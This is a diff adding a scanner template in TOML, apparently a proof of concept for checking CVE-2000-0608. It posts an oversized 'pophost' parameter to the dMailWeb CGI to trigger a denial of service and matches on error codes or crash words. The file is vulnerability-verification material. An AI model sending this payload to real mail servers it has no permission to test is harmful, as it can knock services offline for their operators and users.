@@ -1,0 +1,49 @@
+[info]
+author = "ave"
+description = "验证 NetWin dMailWeb/cwMail 2.6i 及更早版本 POP 参数过长导致拒绝服务漏洞"
+id = "POC-AVE-2000-0726"
+name = "CVE-2000-0608 PoC"
+severity = "medium"
+tags = ["ave-2000-0726"]
+vuln_id = [
+    "CVE-2000-0608",
+    "AVE-2000-0726",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "POST"
+path = "/cgi-bin/dmailweb.exe"
+protocol = "http"
+
+[poc.requests.body]
+content = "pophost={{repeat('A', 1024)}}&username=test&password=test"
+type = "form"
+
+[poc.requests.headers]
+Content-Type = "application/x-www-form-urlencoded"
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+status = [
+    500,
+    502,
+    503,
+    504,
+]
+type = "status"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "crash",
+    "fatal",
+    "error",
+    "segmentation fault",
+    "internal server error",
+]
